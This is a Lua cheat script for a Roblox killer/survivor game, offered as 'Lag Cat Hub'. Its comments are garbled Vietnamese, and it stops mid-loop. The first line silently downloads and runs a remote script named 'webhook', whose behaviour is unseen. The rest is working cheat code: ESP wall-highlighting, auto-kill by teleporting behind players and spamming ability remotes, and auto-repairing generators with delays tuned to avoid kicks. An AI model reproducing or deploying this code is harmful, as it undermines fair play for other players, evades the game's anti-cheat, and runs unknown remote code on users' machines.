 1 | loadstring(game:HttpGet("https://raw.githubusercontent.com/TDDuym500/lol/refs/heads/main/webhook"))()
   2 | 
   3 | local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
   4 | local SaveManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/SaveManager.lua"))()
   5 | local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.com/dawid-scripts/Fluent/master/Addons/InterfaceManager.lua"))()
   6 | 
   7 | local Window = Fluent:CreateWindow({
   8 |     Title = "Lag Cat Hub",
   9 |     SubTitle = "Version 0.0.1 by yeugaivotu",
  10 |     Search = true,
  11 |     Icon = "rbxassetid://",
  12 |     TabWidth = 160,
  13 |     Size = UDim2.fromOffset(480, 360),
  14 |     Acrylic = true,
  15 |     Theme = "Dark",
  16 |     MinimizeKey = Enum.KeyCode.Home,
  17 | 
  18 |     UserInfo = true,
  19 |     UserInfoTop = false,
  20 |     UserInfoTitle = game:GetService("Players").LocalPlayer.DisplayName,
  21 |     UserInfoSubtitle = "memaybeo",
  22 |     UserInfoSubtitleColor = Color3.fromRGB(71, 123, 255)
  23 | })
  24 | 
  25 | local Tabs = {
  26 |     Dev = Window:AddTab({ Title = "About", Icon = "info" }),
  27 |     Farm = Window:AddTab({ Title = "Farm", Icon = "box" }),
  28 |     Main = Window:AddTab({ Title = "Main", Icon = "home" }),
  29 |     Event = Window:AddTab({ Title = "Event", Icon = "bell" }),
  30 |     Custom = Window:AddTab({ Title = "Custom", Icon = "brush" }),
  31 |     Player = Window:AddTab({ Title = "Player", Icon = "user" }),
  32 |     Visual = Window:AddTab({ Title = "Visual", Icon = "eye" }),
  33 |     Misc = Window:AddTab({ Title = "Misc", Icon = "menu" }),
  34 |     Settings = Window:AddTab({ Title = "Settings", Icon = "settings" }),
  35 | }
  36 | 
  37 | -- Ph·∫ßn Logic Ch√≠nh
  38 | 
  39 | --// ‚öôÔ∏è ESPManager v2.7 (Auto-Restore + Debounce 0.5s)
  40 | --// T·ª± th√™m l·∫°i khi model bi·∫øn m·∫•t/hi·ªán, ch·∫øt/h·ªìi sinh, GUI/HL m·∫•t, v·ªõi debounce 0.5s ƒë·ªÉ tr√°nh lag
  41 | 
  42 | local RunService = game:GetService("RunService")
  43 | local Camera = workspace.CurrentCamera
  44 | 
  45 | local ESPManager = {
  46 |     ActiveTypes = {},    -- ["Player"] = true
  47 |     Objects = {},        -- [model] = { type, gui, hl, label, conns = {} }
  48 |     Filters = {},        -- filterFn
  49 |     Colors = {},         -- typeColor
  50 |     Watchers = {},       -- connection table
  51 |     ShowHP = {},         -- typeName -> boolean
  52 |     _pendingCreate = {}, -- [model] = true (debounce)
  53 | }
  54 | 
  55 | -- Helper: safe find primary part
  56 | local function getPrimaryPart(model)
  57 |     if not model then return nil end
  58 |     local p = model:FindFirstChild("HumanoidRootPart") or model:FindFirstChildWhichIsA("BasePart")
  59 |     return p
  60 | end
  61 | 
  62 | --ƒêƒÉng k√Ω lo·∫°i ESP
  63 | function ESPManager:RegisterType(name, color, filterFn, showHP)
  64 |     self.Filters[name] = filterFn
  65 |     self.Colors[name] = color
  66 |     self.ShowHP[name] = showHP or false
  67 |     self.ActiveTypes[name] = false
  68 | end
  69 | 
  70 | -- internal: disconnect connections table
  71 | local function disconnectConns(tbl)
  72 |     if not tbl then return end
  73 |     for _, c in pairs(tbl) do
  74 |         if c and typeof(c.Disconnect) == "function" then
  75 |             pcall(function() c:Disconnect() end)
  76 |         end
  77 |     end
  78 | end
  79 | 
  80 | -- üß± T·∫°o ESP (kh√¥ng debounce) - g·ªçi an to√†n b√™n trong task.delay khi c·∫ßn
  81 | function ESPManager:_CreateImmediate(model, typeName)
  82 |     if not model or not model.Parent then return end
  83 |     if ESPManager.Objects[model] then
  84 |         -- n·∫øu t·ªìn t·∫°i nh∆∞ng b·ªã h·ªèng ph·∫ßn gui/hl th√¨ d·ªçn tr∆∞·ªõc
  85 |         local existing = ESPManager.Objects[model]
  86 |         if existing.gui and existing.gui.Parent and existing.hl and existing.hl.Parent then
  87 |             return -- ƒë√£ ok r·ªìi
  88 |         else
  89 |             ESPManager:Remove(model)
  90 |         end
  91 |     end
  92 | 
  93 |     local color = ESPManager.Colors[typeName]
  94 |     local part = getPrimaryPart(model)
  95 |     if not part then return end
  96 | 
  97 |     -- Billboard
  98 |     local billboard = Instance.new("BillboardGui")
  99 |     billboard.Name = "ESP_" .. typeName
 100 |     billboard.Size = UDim2.new(0, 180, 0, 35)
 101 |     billboard.AlwaysOnTop = true
 102 |     billboard.StudsOffset = Vector3.new(0, 3, 0)
 103 |     billboard.MaxDistance = 600
 104 |     billboard.Parent = part
 105 | 
 106 |     local label = Instance.new("TextLabel")
 107 |     label.Size = UDim2.new(1, 0, 1, 0)
 108 |     label.BackgroundTransparency = 1
 109 |     label.TextColor3 = color
 110 |     label.TextStrokeTransparency = 0.3
 111 |     label.Font = Enum.Font.GothamBold
 112 |     label.TextSize = 16
 113 |     label.Text = model.Name
 114 |     label.Parent = billboard
 115 | 
 116 |     -- Highlight
 117 |     local hl = Instance.new("Highlight")
 118 |     hl.Adornee = model
 119 |     hl.FillColor = color
 120 |     hl.OutlineColor = color
 121 |     hl.FillTransparency = 0.7
 122 |     hl.OutlineTransparency = 0
 123 |     hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
 124 |     hl.Enabled = true
 125 |     hl.Parent = model
 126 | 
 127 |     -- K·∫øt n·ªëi model-level watchers (ƒë·ªÉ t·ª± ph·ª•c h·ªìi khi parent thay ƒë·ªïi / respawn / humanoid died)
 128 |     local conns = {}
 129 | 
 130 |     -- n·∫øu model b·ªã reparent / removed -> schedule recreate (debounced)
 131 |     table.insert(conns, model.AncestryChanged:Connect(function(_, parent)
 132 |         -- n·∫øu model kh√¥ng c√≤n trong workspace, x√≥a ESP
 133 |         if not model:IsDescendantOf(workspace) then
 134 |             -- x√≥a ngay (kh√¥ng recreate khi user t·∫Øt lo·∫°i)
 135 |             if ESPManager.Objects[model] and ESPManager.Objects[model].type == typeName then
 136 |                 ESPManager:Remove(model)
 137 |             end
 138 |             return
 139 |         end
 140 |         -- n·∫øu tr·ªü l·∫°i workspace -> debounce t·∫°o l·∫°i
 141 |         if ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
 142 |             ESPManager:_ScheduleCreate(model, typeName)
 143 |         end
 144 |     end))
 145 | 
 146 |     -- watch humanoid death & respawn
 147 |     local function watchHumanoid(hum)
 148 |         if not hum then return end
 149 |         -- Died -> remove, r·ªìi ch·ªù humanoid m·ªõi
 150 |         table.insert(conns, hum.Died:Connect(function()
 151 |             if ESPManager.Objects[model] and ESPManager.Objects[model].type == typeName then
 152 |                 ESPManager:Remove(model)
 153 |             end
 154 |             -- ch·ªù humanoid m·ªõi xu·∫•t hi·ªán (ChildAdded)
 155 |             -- scheduled create s·∫Ω handle khi Humanoid xu·∫•t hi·ªán
 156 |         end))
 157 |     end
 158 | 
 159 |     -- n·∫øu ƒë√£ c√≥ humanoid, watch n√≥
 160 |     watchHumanoid(model:FindFirstChildOfClass("Humanoid"))
 161 | 
 162 |     -- listen ChildAdded ƒë·ªÉ detect humanoid respawn
 163 |     table.insert(conns, model.ChildAdded:Connect(function(child)
 164 |         if child and child:IsA("Humanoid") then
 165 |             -- humanoid m·ªõi -> schedule create
 166 |             watchHumanoid(child)
 167 |             if ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
 168 |                 ESPManager:_ScheduleCreate(model, typeName)
 169 |             end
 170 |         end
 171 |         -- n·∫øu PrimaryPart xu·∫•t hi·ªán mu·ªôn c≈©ng schedule create
 172 |         if (child:IsA("BasePart") or child:IsA("Model")) and ESPManager.ActiveTypes[typeName] and ESPManager.Filters[typeName](model) then
 173 |             -- primary part may appear later
 174 |             ESPManager:_ScheduleCreate(model, typeName)
 175 |         end
 176 |     end))
 177 | 
 178 |     ESPManager.Objects[model] = {
 179 |         type = typeName,
 180 |         gui = billboard,
 181 |         label = label,
 182 |         hl = hl,
 183 |         conns = conns,
 184 |     }
 185 | end
 186 | 
 187 | -- üß± Public Create (debounced wrapper)
 188 | function ESPManager:_ScheduleCreate(model, typeName)
 189 |     if not model or not typeName then return end
 190 |     -- n·∫øu lo·∫°i ƒëang t·∫Øt th√¨ kh√¥ng schedule
 191 |     if not ESPManager.ActiveTypes[typeName] then return end
 192 |     -- tr√°nh schedule nhi·ªÅu l·∫ßn
 193 |     if ESPManager._pendingCreate[model] then return end
 194 |     ESPManager._pendingCreate[model] = true
 195 | 
 196 |     -- d√πng task.delay 0.5 ƒë·ªÉ debounce, tr√°nh spam t·∫°o khi model ƒëang mid-update
 197 |     task.delay(0.5, function()
 198 |         pcall(function()
 199 |             ESPManager._pendingCreate[model] = nil
 200 |             -- double-check ƒëi·ªÅu ki·ªán
 201 |             if not model or not model.Parent then return end
 202 |             local filterFn = ESPManager.Filters[typeName]
 203 |             if not filterFn or not filterFn(model) then return end
 204 |             -- call immediate create (safe)
 205 |             ESPManager:_CreateImmediate(model, typeName)
 206 |         end)
 207 |     end)
 208 | end
 209 | 
 210 | -- üßπ Xo√° ESP
 211 | function ESPManager:Remove(model)
 212 |     local data = self.Objects[model]
 213 |     if not data then return end
 214 | 
 215 |     -- disconnect model connections
 216 |     if data.conns then
 217 |         disconnectConns(data.conns)
 218 |     end
 219 | 
 220 |     pcall(function() if data.gui then data.gui:Destroy() end end)
 221 |     pcall(function() if data.hl then data.hl:Destroy() end end)
 222 |     self.Objects[model] = nil
 223 |     -- clear pending if any
 224 |     self._pendingCreate[model] = nil
 225 | end
 226 | 
 227 | -- ‚öôÔ∏è T·∫°o watcher (t·ª± ƒë·ªông th√™m/x√≥a ESP khi model thay ƒë·ªïi)
 228 | function ESPManager:StartWatcher(typeName)
 229 |     local filterFn = self.Filters[typeName]
 230 |     if not filterFn then return end
 231 |     if self.Watchers[typeName] then return end
 232 | 
 233 |     -- t·∫°o ESP cho model s·∫µn c√≥ (debounced per model)
 234 |     for _, obj in ipairs(workspace:GetDescendants()) do
 235 |         if filterFn(obj) then
 236 |             -- schedule create with debounce
 237 |             self:_ScheduleCreate(obj, typeName)
 238 |         end
 239 |     end
 240 | 
 241 |     -- theo d√µi model m·ªõi (DescendantAdded) nh∆∞ng schedule create ch·ªâ khi h·ª£p l·ªá
 242 |     local addConn = workspace.DescendantAdded:Connect(function(obj)
 243 |         if self.ActiveTypes[typeName] and filterFn(obj) then
 244 |             self:_ScheduleCreate(obj, typeName)
 245 |         end
 246 |     end)
 247 | 
 248 |     -- khi model b·ªã remove -> Remove ESP n·∫øu c√≥
 249 |     local removeConn = workspace.DescendantRemoving:Connect(function(obj)
 250 |         if self.Objects[obj] and self.Objects[obj].type == typeName then
 251 |             self:Remove(obj)
 252 |         end
 253 |         -- clear any pending create when descendant removing
 254 |         self._pendingCreate[obj] = nil
 255 |     end)
 256 | 
 257 |     self.Watchers[typeName] = {add = addConn, rem = removeConn}
 258 | end
 259 | 
 260 | function ESPManager:StopWatcher(typeName)
 261 |     local w = self.Watchers[typeName]
 262 |     if w then
 263 |         if w.add then w.add:Disconnect() end
 264 |         if w.rem then w.rem:Disconnect() end
 265 |     end
 266 |     self.Watchers[typeName] = nil
 267 | end
 268 | 
 269 | -- ‚ôªÔ∏è C·∫≠p nh·∫≠t (1 v√≤ng duy nh·∫•t, c·ª±c nh·∫π) - CH·ªà c·∫≠p nh·∫≠t text / ki·ªÉm tra nhanh
 270 | RunService.Heartbeat:Connect(function()
 271 |     -- S·ª≠ d·ª•ng pairs(Objects) nh·ªè (ch·ªâ nh·ªØng model c√≥ ESP hi·ªán t·∫°i)
 272 |     for model, data in pairs(ESPManager.Objects) do
 273 |         -- n·∫øu model h·ªèng -> d·ªçn
 274 |         if not model or not model.Parent then
 275 |             ESPManager:Remove(model)
 276 |         else
 277 |             local part = getPrimaryPart(model)
 278 |             if not part then
 279 |                 ESPManager:Remove(model)
 280 |             else
 281 |                 -- n·∫øu gui/hl b·ªã x√≥a b·∫•t ng·ªù -> schedule recreate (debounced)
 282 |                 local needRecreate = false
 283 |                 if (not data.gui) or (not data.hl) or (not data.label) then
 284 |                     needRecreate = true
 285 |                 else
 286 |                     -- ki·ªÉm tra parent t√¨nh tr·∫°ng (n·∫øu parent nil)
 287 |                     if not data.gui.Parent then
 288 |                         needRecreate = true
 289 |                     end
 290 |                 end
 291 |                 if needRecreate then
 292 |                     -- remove entry ngay (d·ªçn) v√† schedule t·∫°o l·∫°i an to√†n
 293 |                     local typeName = data.type
 294 |                     ESPManager:Remove(model)
 295 |                     ESPManager:_ScheduleCreate(model, typeName)
 296 |                     -- next model
 297 |                 else
 298 |                     -- c·∫≠p nh·∫≠t text (nh·∫π)
 299 |                     local dist = (Camera.CFrame.Position - part.Position).Magnitude
 300 |                     local txt = model.Name
 301 |                     local showHP = ESPManager.ShowHP[data.type]
 302 |                     if showHP then
 303 |                         local hum = model:FindFirstChildOfClass("Humanoid")
 304 |                         if hum then
 305 |                             txt = string.format("%s | HP:%d | [%.0fm]", txt, math.floor(hum.Health), dist)
 306 |                         else
 307 |                             txt = string.format("%s [%.0fm]", txt, dist)
 308 |                         end
 309 |                     else
 310 |                         txt = string.format("%s [%.0fm]", txt, dist)
 311 |                     end
 312 |                     if data.label then
 313 |                         -- label update is cheap
 314 |                         pcall(function() data.label.Text = txt end)
 315 |                     end
 316 |                 end
 317 |             end
 318 |         end
 319 |     end
 320 | end)
 321 | 
 322 | -- ‚ö° B·∫≠t/T·∫Øt t·ª´ng lo·∫°i ESP
 323 | function ESPManager:SetEnabled(typeName, state)
 324 |     self.ActiveTypes[typeName] = state
 325 | 
 326 |     if state then
 327 |         self:StartWatcher(typeName)
 328 |         -- khi b·∫≠t l·∫°i, qu√©t nhanh to√†n b·ªô workspace v√† schedule create (debounced)
 329 |         local filterFn = self.Filters[typeName]
 330 |         if filterFn then
 331 |             for _, obj in ipairs(workspace:GetDescendants()) do
 332 |                 if filterFn(obj) then
 333 |                     self:_ScheduleCreate(obj, typeName)
 334 |                 end
 335 |             end
 336 |         end
 337 |     else
 338 |         self:StopWatcher(typeName)
 339 |         -- x√≥a to√†n b·ªô ESP lo·∫°i ƒë√≥
 340 |         for model, data in pairs(self.Objects) do
 341 |             if data.type == typeName then
 342 |                 self:Remove(model)
 343 |             end
 344 |         end
 345 |     end
 346 | end
 347 | 
 348 | _G.ESPManager = ESPManager
 349 | 
 350 | 
 351 | -- Tab.Dev
 352 | 
 353 | local Options = Fluent.Options
 354 | 
 355 | 
 356 |     Tabs.Dev:AddParagraph({
 357 |         Title = "Note",
 358 |         Content = "Thank you for using the script!"
 359 |     })
 360 | 
 361 |     Tabs.Dev:AddSection("‚Ü≥Links")
 362 | 
 363 |     Tabs.Dev:AddButton({
 364 |         Title = "Discord",
 365 |         Description = "Copy the link to join the discord!",
 366 |         Callback = function()
 367 |             setclipboard("https://discord.gg/KTG45Zv58j")
 368 |             Fluent:Notify({
 369 |                 Title = "Notification",
 370 |                 Content = "Successfully copied to the clipboard",
 371 |                 SubContent = "", -- Optional
 372 |                 Duration = 3 
 373 |             })
 374 |         end
 375 |     })
 376 | 
 377 | 
 378 | -- Tabs.Farm
 379 | 
 380 | 
 381 | 
 382 | 
 383 | do
 384 |     local Players = game:GetService("Players")
 385 |     local ReplicatedStorage = game:GetService("ReplicatedStorage")
 386 |     local LocalPlayer = Players.LocalPlayer
 387 | 
 388 |     local Active = false
 389 |     local loopRunning = false
 390 |     local CurrentTarget = nil
 391 |     local lastAttack = 0
 392 | 
 393 |     -- üü• Ch·ªâ ch·∫°y khi l√† c√°c model n√†y
 394 |     local KillersList = {
 395 |         ["Slasher"] = true,
 396 |         ["1x1x1x1"] = true,
 397 |         ["c00lkidd"] = true,
 398 |         ["Noli"] = true,
 399 |         ["JohnDoe"] = true,
 400 |         ["Guest 666"] = true,
 401 |         ["Sixer"] = true,
 402 |     }
 403 | 
 404 |     -- üü¢ Danh s√°ch ∆∞u ti√™n
 405 |     local PriorityList = {
 406 |         ["0206octavio"] = true
 407 |     }
 408 | 
 409 |     -- üî• Danh s√°ch skill (full, c√≥ th·ªÉ th√™m/b·ªõt tho·∫£i m√°i)
 410 |     local SkillList = {
 411 |         "Slash", "Stab", "Punch",
 412 |         "VoidRush", "Nova",
 413 |         "CorruptEnergy", "Behead", "GashingWound",
 414 |         "MassInfection", "CorruptNature", "WalkspeedOverride", "PizzaDelivery",
 415 |         "UnstableEye", "Entanglement",
 416 |         "DigitalFootprint", "404Error",
 417 |         "RagingPace", "Carving Slash", "Demonic Pursuit",
 418 |         "Infernal Cry", "Blood Rush"
 419 |     }
 420 | 
 421 |     -- =====================
 422 |     -- üó°Ô∏è RemoteEvent Finder
 423 |     -- =====================
 424 |     local SkillRemotes = {}
 425 | 
 426 |     local function findSkillRemoteFromButton(button)
 427 |         for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
 428 |             local f = conn.Function
 429 |             if f and islclosure(f) then
 430 |                 for _, v in pairs(getupvalues(f)) do
 431 |                     if typeof(v) == "Instance" and v:IsA("RemoteEvent") then
 432 |                         return v
 433 |                     end
 434 |                 end
 435 |             end
 436 |         end
 437 |         return nil
 438 |     end
 439 | 
 440 |     local function initSkillButtons()
 441 |         local gui = LocalPlayer:FindFirstChild("PlayerGui")
 442 |         if not gui then return end
 443 |         local mainUI = gui:FindFirstChild("MainUI")
 444 |         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
 445 |         if not container then return end
 446 | 
 447 |         for _, child in ipairs(container:GetChildren()) do
 448 |             if child:IsA("ImageButton") then
 449 |                 local remote = findSkillRemoteFromButton(child)
 450 |                 if remote then
 451 |                     SkillRemotes[child.Name] = remote
 452 |                     warn("[Skill] Found RemoteEvent for:", child.Name, remote:GetFullName())
 453 |                 end
 454 |             end
 455 |         end
 456 |     end
 457 | 
 458 |     initSkillButtons()
 459 |     LocalPlayer.CharacterAdded:Connect(function()
 460 |         task.wait(1)
 461 |         initSkillButtons()
 462 |     end)
 463 | 
 464 |     -- =====================
 465 |     -- üéØ Target Finder
 466 |     -- =====================
 467 |     local function GetPriorityTarget()
 468 |         local survivorsFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Survivors")
 469 |         if not survivorsFolder then return nil end
 470 | 
 471 |         for _, survivor in ipairs(survivorsFolder:GetChildren()) do
 472 |             if survivor:IsA("Model") and survivor:FindFirstChild("HumanoidRootPart") then
 473 |                 if PriorityList[survivor.Name] then
 474 |                     local humanoid = survivor:FindFirstChildOfClass("Humanoid")
 475 |                     if humanoid and humanoid.Health > 0 then
 476 |                         return survivor
 477 |                     end
 478 |                 end
 479 |             end
 480 |         end
 481 |         return nil
 482 |     end
 483 | 
 484 |     local function GetClosestSurvivor()
 485 |         local priorityTarget = GetPriorityTarget()
 486 |         if priorityTarget then return priorityTarget end
 487 | 
 488 |         local localChar = LocalPlayer.Character
 489 |         if not (localChar and localChar:FindFirstChild("HumanoidRootPart")) then return nil end
 490 |         local survivorsFolder = workspace:FindFirstChild("Players") and workspace.Players:FindFirstChild("Survivors")
 491 |         if not survivorsFolder then return nil end
 492 | 
 493 |         local closest, minDist = nil, math.huge
 494 |         for _, survivor in ipairs(survivorsFolder:GetChildren()) do
 495 |             local humanoid = survivor:FindFirstChildOfClass("Humanoid")
 496 |             if survivor:IsA("Model") and survivor:FindFirstChild("HumanoidRootPart") and humanoid and humanoid.Health > 0 then
 497 |                 local dist = (localChar.HumanoidRootPart.Position - survivor.HumanoidRootPart.Position).Magnitude
 498 |                 if dist < minDist then
 499 |                     minDist = dist
 500 |                     closest = survivor
 501 |                 end
 502 |             end
 503 |         end
 504 |         return closest
 505 |     end
 506 | 
 507 |     -- =====================
 508 |     -- üó°Ô∏è Kill Logic (spam nhanh + Remote + UI Click)
 509 |     -- =====================
 510 |     local function KillTarget(target)
 511 |         pcall(function()
 512 |             if not target then return end
 513 |             local localChar = LocalPlayer.Character
 514 |             if not (localChar and localChar:FindFirstChild("HumanoidRootPart")) then return end
 515 | 
 516 |             local root = localChar.HumanoidRootPart
 517 |             local targetRoot = target:FindFirstChild("HumanoidRootPart")
 518 |             if not targetRoot then return end
 519 | 
 520 |             -- Spam skill (m·ªói 0.05s)
 521 |             if tick() - lastAttack >= 0.05 then
 522 |                 lastAttack = tick()
 523 | 
 524 |                 for _, skillName in ipairs(SkillList) do
 525 |                     -- lu√¥n c·∫≠p nh·∫≠t v·ªã tr√≠ s√°t l∆∞ng target tr∆∞·ªõc khi d√πng skill
 526 |                     local offset = targetRoot.CFrame.LookVector * -2
 527 |                     root.CFrame = targetRoot.CFrame + offset
 528 | 
 529 |                     local remote = SkillRemotes[skillName]
 530 |                     if remote then
 531 |                         -- C√°ch 1: FireServer tr·ª±c ti·∫øp
 532 |                         remote:FireServer(true)
 533 |                         task.wait(0.005)
 534 |                         remote:FireServer(false)
 535 |                     else
 536 |                         -- C√°ch 2: Gi·∫£ click n√∫t skill trong GUI
 537 |                         local gui = LocalPlayer:FindFirstChild("PlayerGui")
 538 |                         local mainUI = gui and gui:FindFirstChild("MainUI")
 539 |                         local container = mainUI and mainUI:FindFirstChild("AbilityContainer")
 540 |                         if container then
 541 |                             local button = container:FindFirstChild(skillName)
 542 |                             if button and button:IsA("ImageButton") then
 543 |                                 for _, conn in ipairs(getconnections(button.MouseButton1Click)) do
 544 |                                     if conn.Function then
 545 |                                         pcall(conn.Function)
 546 |                                     end
 547 |                                 end
 548 |                                 pcall(function() button:Activate() end)
 549 |                             end
 550 |                         end
 551 | 
 552 |                         -- fallback cu·ªëi c√πng: Remote g·ªëc trong ReplicatedStorage
 553 |                         local net = ReplicatedStorage:FindFirstChild("Modules")
 554 |                                     and ReplicatedStorage.Modules:FindFirstChild("Network")
 555 |                                     and ReplicatedStorage.Modules.Network:FindFirstChild("RemoteEvent")
 556 |                         if net and typeof(net.FireServer) == "function" then
 557 |                             net:FireServer("UseActorAbility", skillName)
 558 |                         end
 559 |                     end
 560 | 
 561 |                     task.wait(0.01) -- gi·ªØ nh·ªãp nhanh
 562 |                 end
 563 |             end
 564 |         end)
 565 |     end
 566 | 
 567 |     -- =====================
 568 |     -- üîÑ Main Loop
 569 |     -- =====================
 570 |     local function StartLoop()
 571 |         if loopRunning then return end
 572 |         loopRunning = true
 573 |         task.spawn(function()
 574 |             while Active do
 575 |                 -- üõë N·∫øu kh√¥ng ph·∫£i killer h·ª£p l·ªá th√¨ kh√¥ng l√†m g√¨
 576 |                 local char = LocalPlayer.Character
 577 |                 if not (char and KillersList[char.Name]) then
 578 |                     CurrentTarget = nil
 579 |                     task.wait(0.5)
 580 |                     continue
 581 |                 end
 582 | 
 583 |                 if not CurrentTarget 
 584 |                    or not CurrentTarget.Parent 
 585 |                    or not CurrentTarget:FindFirstChildOfClass("Humanoid") 
 586 |                    or CurrentTarget:FindFirstChildOfClass("Humanoid").Health <= 0 then
 587 |                     CurrentTarget = GetClosestSurvivor()
 588 |                 end
 589 |                 if CurrentTarget then
 590 |                     KillTarget(CurrentTarget)
 591 |                 end
 592 |                 task.wait(0.01)
 593 |             end
 594 |             loopRunning = false
 595 |         end)
 596 |     end
 597 | 
 598 |     Tabs.Farm:AddToggle("KillersFarmV2", {
 599 |         Title = "Killers Farm V2",
 600 |         Default = false,
 601 |         Callback = function(Value)
 602 |             Active = Value
 603 |             if Active then
 604 |                 StartLoop()
 605 |             end
 606 |         end
 607 |     })
 608 | end
 609 | 
 610 | 
 611 | 
 612 | 
 613 | local Players = game:GetService("Players")
 614 | local LP = Players.LocalPlayer
 615 | 
 616 | local solveGeneratorCooldown = false
 617 | local genDelay = 0.75 -- delay m·∫∑c ƒë·ªãnh
 618 | local currentCharacter
 619 | local Spectators = {}
 620 | local isInGame, Survivor = false, false
 621 | 
 622 | -- üü• Killer nguy hi·ªÉm
 623 | local DangerousKillers = {
 624 |     ["Slasher"] = true,
 625 |     ["1x1x1x1"] = true,
 626 |     ["c00lkidd"] = true,
 627 |     ["Noli"] = true,
 628 |     ["JohnDoe"] = true,
 629 |     ["Guest 666"] = true,
 630 |     ["Sixer"] = true
 631 | }
 632 | 
 633 | -- üü¢ Ki·ªÉm tra killer g·∫ßn generator
 634 | local function isKillerNearGenerator(generatorPos, distance)
 635 |     local killersFolder = workspace.Players:FindFirstChild("Killers")
 636 |     if not killersFolder then return false end
 637 |     for _, killer in ipairs(killersFolder:GetChildren()) do
 638 |         if killer:IsA("Model") and killer:FindFirstChild("HumanoidRootPart") then
 639 |             if DangerousKillers[killer.Name] then
 640 |                 local dist = (killer.HumanoidRootPart.Position - generatorPos).Magnitude
 641 |                 if dist <= distance then
 642 |                     return true
 643 |                 end
 644 |             end
 645 |         end
 646 |     end
 647 |     return false
 648 | end
 649 | 
 650 | -- üü¢ T√¨m generator ch∆∞a xong (c·∫≠p nh·∫≠t genDelay lu√¥n)
 651 | local function getUnfinishedGenerators()
 652 |     local list = {}
 653 |     local map = workspace:FindFirstChild("Map") 
 654 |         and workspace.Map:FindFirstChild("Ingame") 
 655 |         and workspace.Map.Ingame:FindFirstChild("Map")
 656 |     if map then
 657 |         for _, gen in ipairs(map:GetChildren()) do
 658 |             if gen.Name == "Generator" 
 659 |                 and gen:FindFirstChild("Progress") 
 660 |                 and gen.Progress.Value < 100 then
 661 |                 table.insert(list, gen)
 662 |             end
 663 |         end
 664 |     end
 665 | 
 666 |     -- ‚ö° N·∫øu ch·ªâ c√≤n 1 generator => tƒÉng delay ƒë·ªÉ tr√°nh b·ªã kick
 667 |     if #list == 1 then
 668 |         genDelay = 1.5
 669 |     else
 670 |         genDelay = 0.75
 671 |     end
 672 | 
 673 |     return list
 674 | end
 675 | 
 676 | -- üü¢ S·ª≠a 1 l·∫ßn r·ªìi nh·∫£y sang generator kh√°c
 677 | local function fixOneGenerator(gen)
 678 |     if solveGeneratorCooldown then return end
 679 |     if not currentCharacter or not currentCharacter:FindFirstChild("HumanoidRootPart") then return end
 680 | 
 681 |     local genCFrame = gen:GetPivot()
 682 |     local goalPos = (genCFrame * CFrame.new(0, 0, -7)).Position
 683 | 
 684 |     if isKillerNearGenerator(goalPos, 50) then
 685 |         print("‚ö†Ô∏è B·ªè qua generator v√¨ killer nguy hi·ªÉm g·∫ßn!")
 686 |         return
 687 |     end
 688 | 
 689 |     -- Teleport t·ªõi gen
 690 |     currentCharacter:PivotTo(CFrame.new(goalPos + Vector3.new(0, 0, 0))) -- ch·ªânh ƒë·ªô cao, ƒë·ªô l·ªách
 691 |     task.wait(0.25)
 692 | 
 693 |     local prompt = gen:FindFirstChild("Main") and gen.Main:FindFirstChild("Prompt")
 694 |     if prompt then
 695 |         prompt.HoldDuration = 0
 696 |         prompt.RequiresLineOfSight = false
 697 |         prompt.MaxActivationDistance = 99999
 698 | 
 699 |         -- ·∫§n ƒë·ªÉ s·ª≠a 1 l·∫ßn
 700 |         pcall(function()
 701 |             prompt:InputHoldBegin()
 702 |             prompt:InputHoldEnd()
 703 |         end)
 704 |     end
 705 | 
 706 |     if gen:FindFirstChild("Remotes") and gen.Remotes:FindFirstChild("RE") then
 707 |         gen.Remotes.RE:FireServer()
 708 |     end
 709 | 
 710 |     -- üî¥ Spam th√™m v√†i l·∫ßn ƒë·ªÉ ch·∫Øc ch·∫Øn tho√°t GUI tr∆∞·ªõc khi ƒëi gen kh√°c
 711 |     if prompt then
 712 |         task.wait(0)
 713 |         pcall(function()
 714 |             for i = 1, 3 do
 715 |                 prompt:InputHoldBegin()
 716 |                 task.wait(0)
 717 |                 prompt:InputHoldEnd()
 718 |             end
 719 |         end)
 720 |     end
 721 | 
 722 |     -- Cooldown
 723 |     solveGeneratorCooldown = true
 724 |     task.delay(genDelay, function()
 725 |         solveGeneratorCooldown = false
 726 |     end)
 727 | end
 728 | 
 729 | -- üü¢ Survivors Auto Farm
 730 | Tabs.Farm:AddToggle("SurvivorsAutoFarmV2", {
 731 |     Title = "Survivors Farm V2",
 732 |     Default = false
 733 | }):OnChanged(function(Value)
 734 |     _G.SurvivorsFarm = Value
 735 | 
 736 |     -- C·∫≠p nh·∫≠t tr·∫°ng th√°i in-game
 737 |     task.spawn(function()
 738 |         while _G.SurvivorsFarm do
 739 |             Spectators = {}
 740 |             for _, v in ipairs(workspace:WaitForChild("Players"):WaitForChild("Spectating"):GetChildren()) do
 741 |                 table.insert(Spectators, v.Name)
 742 |             end
 743 |             isInGame = not table.find(Spectators, LP.Name)
 744 |             task.wait(0.1)
 745 |         end
 746 |     end)
 747 | 
 748 |     -- Ki·ªÉm tra survivor
 749 |     task.spawn(function()
 750 |         while _G.SurvivorsFarm do
 751 |             if workspace:FindFirstChild("Players") then
 752 |                 local survivorsFolder = workspace.Players:FindFirstChild("Survivors")
 753 |                 Survivor = survivorsFolder 
 754 |                     and (survivorsFolder:FindFirstChild(LP.Name) 
 755 |                     or table.find(survivorsFolder:GetChildren(), LP.Character))
 756 |             end
 757 |             task.wait(0.1)
 758 |         end
 759 |     end)
 760 | 
 761 |     -- Auto s·ª≠a gen
 762 |     task.spawn(function()
 763 |         local survivorsFolder = workspace.Players:WaitForChild("Survivors")
 764 |         while _G.SurvivorsFarm do
 765 |             if Survivor and isInGame then
 766 |                 -- l·∫•y nh√¢n v·∫≠t hi·ªán t·∫°i
 767 |                 for _, surv in ipairs(survivorsFolder:GetChildren()) do
 768 |                     if surv:GetAttribute("Username") == LP.Name then
 769 |                         currentCharacter = surv
 770 |                         break
 771 |                     end
 772 |                 end
 773 | 
 774 |                 -- t√¨m gen ch∆∞a xong v√† s·ª≠a 1 l·∫ßn
